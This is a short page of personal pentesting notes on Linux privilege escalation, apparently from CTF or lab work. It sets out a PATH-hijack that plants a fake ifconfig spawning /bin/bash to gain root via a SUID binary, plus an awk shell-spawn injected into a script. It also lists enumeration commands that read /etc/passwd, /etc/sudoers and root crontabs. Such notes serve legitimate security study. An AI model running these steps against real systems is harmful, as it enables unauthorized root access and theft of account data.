---
tags: 🔻 🔻/OS/linux
aliases: Hacking Notes
---

# Linux 

path based  
  
cd /tmp  
echo "/bin/bash" > ifconfig  
chmod 777 ifconfig  
export PATH=/tmp:$PATH  
/opt/ignite  
cd /root  
ls  
cat final.txt  
    

    
  
curl -X POST *http://blablabla*
  
  
/home/kyle/script/test  
echo "awk 'BEGIN {system(\\"/bin/bash\\")}'" > test


# basic enumeration
  
cat /etc/issue; 
cat /etc/\*-release; 
cat /etc/lsb-release; 
cat /etc/redhat-release;  
  

## Applications & Services

 
  
Sensitive info search  
  
w  
last  
cat /etc/passwd | cut -d: -f1 # List of users  
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}' # List of super users  
awk -F: '($3 == "0") {print}' /etc/passwd # List of super users  
cat /etc/sudoers  
sudo -l

# Cron
#cron #privesc

crontab -l  
ls -alh /var/spool/cron  
ls -al /etc/ | grep cron  
ls -al /etc/cron\*  
cat /etc/cron\*  
cat /etc/at.allow  
cat /etc/at.deny  
cat /etc/cron.allow  
cat /etc/cron.deny  
cat /etc/crontab  
cat /etc/anacrontab  
cat /var/spool/cron/crontabs/root